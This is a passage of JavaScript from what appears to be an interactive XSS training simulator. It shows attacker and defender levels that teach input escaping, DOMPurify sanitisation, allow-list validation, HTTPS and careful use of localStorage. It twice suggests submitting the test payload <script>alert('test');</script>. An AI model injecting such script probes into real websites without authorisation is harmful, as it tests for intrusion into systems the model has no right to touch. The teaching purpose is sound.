        document.getElementById("circleInteractiveText1").innerHTML = "Escape and sanitize user input to the website";
        document.getElementById("circleInteractiveText2").innerHTML = "Enable HTTPS for the website";
        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1.png";

        document.getElementById('sanitizedText').style.visibility = "hidden";
        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 35%;visibility:visible;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 40%;visibility:visible;font-size: 2vw;");


        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:90%;left:10%;width:60%;background-color: #FF7F11;font-size: 1.8vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above two actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:1,Level:1")) {
            simulatorZoneAnswersArray.push("!Role:1,Level:1");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:1,Level:1");
            addedToSZArray = true;
        }



        if (buttonID == 1) {



            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "visible";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const XSSCheckBoxAttackerReflectedVariable = document.getElementById("XSSCheckBoxAttackerReflected");
            document.getElementById("XSSCheckBoxAttackerReflected").value = "";
            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:25%;left:25%;width:28%;height:10%;visibility: visible;z-index: 1;font-size:1.5vw;");



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1-Sim-Script.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:50%;height:45%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:4%;width:65%;font-size:1.7vw;");
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submit a script such as &lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt; and click the check button to observe the escaped result. ";
            insideSimulatorAction1 = true;



            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:1,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:1,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";


            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');

            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L1-1-Interactive-HTTPS.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:40%;width:55%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";

            document.getElementById('simulatorInteractiveText1').innerHTML = "Hypertext Transfer Protocol Secure (HTTPS) is a protocol that secures communication and data transfer between a user's web browser and a website. This can protect users against eavesdroppers and man-in-the-middle (MitM) attacks.";

            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:78%;left:8%;width:70%;background-color: #435274;font-size: 1.8vw;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:80%;visibility: visible;");
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }




            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:1,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:1,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 1 && (currentLevelNo == 2 || currentLevelNo == 200)) || ((roleId == 1 && currentLevelNo == 2 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:23%;left:20%;height:40%;width:50%");
        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:35%;left:65%;width:25%;height:50%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:45%;");

        document.getElementById("circleInteractiveText1").innerHTML = "Escaping and <br>sanitizing any user input";
        document.getElementById("circleInteractiveText2").innerHTML = "Enable HTTPS for the website";
        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-1.png";

        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
        document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 1.8vw;");

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:83%;left:10%;width:50%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above action can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;


        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:1,Level:2")) {
            simulatorZoneAnswersArray.push("!Role:1,Level:2");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:1,Level:2");
            addedToSZArray = true;
        }


        if (buttonID == 1) {

            const XSSCheckBoxAttackerReflectedVariable = document.getElementById('XSSCheckBoxAttackerReflected');
            const CheckButtonXSSAttackerReflectedVariable = document.getElementById('CheckButtonXSSAttackerReflected');


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('sanitizedText').style.visibility = "hidden";

            XSSCheckBoxAttackerReflectedVariable.setAttribute("style", "position:fixed;top:58%;left:13%;height:10%;z-index: 1;visibility: visible;");
            CheckButtonXSSAttackerReflectedVariable.setAttribute("style", "position:fixed;top:60%;left:45%;z-index: 1;visibility: visible;");

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-2-Stored.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:40%;width:60%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:10%;width:60%;font-size: 2vw;background-color: #5e3c58");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submit a script such as &lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt; and click the check button to observe the escaped result. ";
            insideSimulatorAction1 = true;
            document.getElementById("XSSCheckBoxAttackerReflected").value = "";

            if (!SimZoneSkills1AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:2,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:2,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        }


    } else if ((roleId == 1 && (currentLevelNo == 3 || currentLevelNo == 200)) || ((roleId == 1 && currentLevelNo == 3 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:45%;width:55%;");
        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:60%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:18%;width:25%;height:50%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-2%;left:40%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-3%;left:30%;");

        document.getElementById("circleInteractiveText1").innerHTML = "Validate input types";
        document.getElementById("circleInteractiveText2").innerHTML = "Input escape/sanitization";
        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-1.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 2vw;");

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:10%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;


        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:1,Level:3")) {
            simulatorZoneAnswersArray.push("!Role:1,Level:3");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:1,Level:3");
            addedToSZArray = true;
        }


        if (buttonID == 1) {



            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L3-1-Interactive-CSP.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:-19%;left:-15%;transform: scale(0.55, 0.55);z-index: 1;visibility: hidden;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:78%;left:6%;font-size: 1.8vw;width:65%;background-color:#5e3c58;");
            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:20%;left:6%;font-size: 2vw;width:90%;background-color:rgb(0, 0, 0);");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').innerHTML = "The code in red validates the name against an allowed list of inputs (e.g., ['Paris', 'Milan', 'New York']). The code further rejects anything else (to prevent script injection or file path abuse).";
            document.getElementById('simulatorInteractiveText2').innerHTML = "&lt;script&gt; <br> function chooseTab(name){ <br> <span style='color:red'>const allowedNames = ['Paris', 'Milan', 'New York']; <br> if (!allowedNames.includes(name)) { <br> console.warn('Invalid tab name: ' + name); <br> return; // exit early if name is not allowed</span>} <br>  var html = 'Image: ' + name + '&lt;br&gt;'; <br> html += '&lt;img src='/static/myshopping/store' + encodeURIComponent(name) + '.jpg' /&gt;'; <br>... ";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:3,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:3,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";


            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');
            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L1-1-Interactive-HTTPS.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:40%;width:55%;z-index: 1;visibility: hidden;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "visible";

            document.getElementById('simulatorInteractiveText1').innerHTML = "The code in blue removes dangerous HTML code and further converts HTML code into non-executable text. This can prevent to prevent script injection or file path abuse.";
            document.getElementById('simulatorInteractiveText2').innerHTML = "&lt;script&gt;<br><span style='color:blue'>// Escape function for plain text use <br>function escapeHTML(str) {return str.replace(/[&amp;&lt;&gt;&quot;']/g, function (m) {return ({'&amp;': '&amp;amp;','&lt;': '&amp;lt;','&gt;': '&amp;gt;','&quot;': '&amp;quot;',&quot;'&quot;: '&amp;#39;'})[m];});}</span><br>function chooseTab(name) {<br><span style='color:blue'>// Sanitize name using DOMPurify<br>const sanitized = DOMPurify.sanitize(name);<br>// Escape it for use in text<br>const safeName = escapeHTML(sanitized);</span><br>// Build safe HTML string<br>const html = &quot;Image: &quot; + safeName + &quot;&lt;br&gt;&quot; +&quot;<br>&lt;img src='/static/myshopping/store&quot; + encodeURIComponent(sanitized) + &quot;.jpg' alt='Store image' /&gt;&quot;;<br>...";



            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:78%;left:8%;width:70%;background-color: #435274;font-size: 1.8vw;");
            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:20%;left:6%;font-size: 1.5vw;width:90%;background-color:rgb(0, 0, 0);visibility: visible;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:80%;visibility: visible;");
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:3,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:3,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 1 && (currentLevelNo == 4 || currentLevelNo == 200)) || ((roleId == 1 && currentLevelNo == 4 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:45%;width:55%;");
        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:60%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:18%;width:25%;height:50%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-2%;left:40%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-3%;left:30%;");

        document.getElementById("circleInteractiveText1").innerHTML = "Use localStorage <br>reponsibly";
        document.getElementById("circleInteractiveText2").innerHTML = "Input escape/sanitization";
        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L3-2-Username-LS-Sim.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "hidden";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 30%;visibility:visible;font-size: 2vw;");

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:10%;width:60%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;


        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:1,Level:4")) {
            simulatorZoneAnswersArray.push("!Role:1,Level:4");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:1,Level:4");
            addedToSZArray = true;
        }


        if (buttonID == 1) {



            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L2-4-Sim-LS-Clean.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:25%;height:50%;width:40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:6%;font-size: 1.8vw;width:65%;background-color:#5e3c58;");
            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:20%;left:6%;font-size: 2vw;width:90%;background-color:rgb(0, 0, 0);");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Sensitive data should not be stored in localStorage. Also it is best practice to clear localStorage when the data is no longer needed. ";
            document.getElementById('simulatorInteractiveText2').innerHTML = "&lt;script&gt; <br> function chooseTab(name){ <br> <span style='color:red'>const allowedNames = ['Paris', 'Milan', 'New York']; <br> if (!allowedNames.includes(name)) { <br> console.warn('Invalid tab name: ' + name); <br> return; // exit early if name is not allowed</span>} <br>  var html = 'Image: ' + name + '&lt;br&gt;'; <br> html += '&lt;img src='/static/myshopping/store' + encodeURIComponent(name) + '.jpg' /&gt;'; <br>... ";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:4,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:4,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";


            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
            const InteractivityBackButton1Variable = document.getElementById('InteractivityBackButton1');
            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L1-1-Interactive-HTTPS.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:40%;width:55%;z-index: 1;visibility: hidden;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "visible";

            document.getElementById('simulatorInteractiveText1').innerHTML = "The code in blue removes dangerous HTML code and further converts HTML code into non-executable text. This can prevent to prevent script injection or file path abuse.";
            document.getElementById('simulatorInteractiveText2').innerHTML = "&lt;script&gt;<span style='color:blue'><br>function escapeHtml(str) {<br>return str.replace(/[&amp;&lt;&gt;&quot;']/g, function (match) {const escapeChars = {'&amp;': '&amp;amp;','&lt;': '&amp;lt;','&gt;': '&amp;gt;','&quot;': '&amp;quot;',&quot;'&quot;: '&amp;#39;'};return escapeChars[match];});}</span><br>let username = localStorage.getItem(&quot;username&quot;);<span style='color:blue'><br>// Use DOMPurify to sanitize the input and escape it<br>const sanitizedUsername = DOMPurify.sanitize(escapeHtml(username));<br>document.getElementById(&quot;welcomeMessage&quot;).textContent = &quot;Welcome, &quot; + sanitizedUsername;</span><br>...";



            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:78%;left:8%;width:70%;background-color: #435274;font-size: 1.8vw;");
            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:20%;left:6%;font-size: 1.6vw;width:90%;background-color:rgb(0, 0, 0);visibility: visible;");
            InteractivityBackButton1Variable.setAttribute("style", "position:fixed;top:12%;left:80%;visibility: visible;");
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                DefenderSimZoneSkillsValue = DefenderSimZoneSkillsValue + defenderSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;
            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:1,Level:4,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:1,Level:4,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 1 && (currentLevelNo == 5 || currentLevelNo == 200)) || ((roleId == 1 && currentLevelNo == 5 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:30%;left:20%;height:40%;width:50%;");
        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:68%;width:25%;height:50%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:8%;left:46%;");

        document.getElementById("circleInteractiveText1").innerHTML = "Loading malicious resources from unauthorized sources";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Defender-L3-1.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
        document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
